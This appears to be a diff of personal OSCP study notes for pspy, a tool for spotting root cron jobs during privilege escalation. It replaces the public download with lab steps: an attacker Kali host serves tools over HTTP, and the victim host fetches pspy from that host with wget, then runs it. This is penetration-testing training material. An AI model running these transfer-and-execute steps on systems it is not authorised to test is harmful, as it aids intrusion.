@@ -1,35 +1,27 @@
-# 🐍 pspy Cheat Sheet – Detecting Root Cron Jobs / Periodic Processes
+# 🐍 pspy Cheat Sheet – Detecting Root Cron Jobs / Periodic Processes (Without Sudo)
 
 ---
 
-## 1️⃣ What is pspy?
-
-- Lightweight Go binary
-- Monitors `ps` output in real-time
-- Can see processes **without sudo**
-- Perfect for spotting cron jobs, scripts, or processes run by root
-
----
-
-## 2️⃣ Installation / Setup
-
-No compilation needed — just download:
-
-# 64-bit Linux  
+On attacker Kali
 
 ```
-wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64  
-```
-# Make it executable  
-
-```
-chmod +x pspy64
+cd ~/Desktop/Tools && python -m http.server 80
 ```
 
-Optional: move to `$PATH`:
+On Victim Host
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `wget http://${KaliIP}:80/pspy64 -O pspy`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+chmod +x pspy
+```
 
 ```
-sudo mv pspy64 /usr/local/bin/pspy
+./pspy > pspy.log
 ```
 
 ---
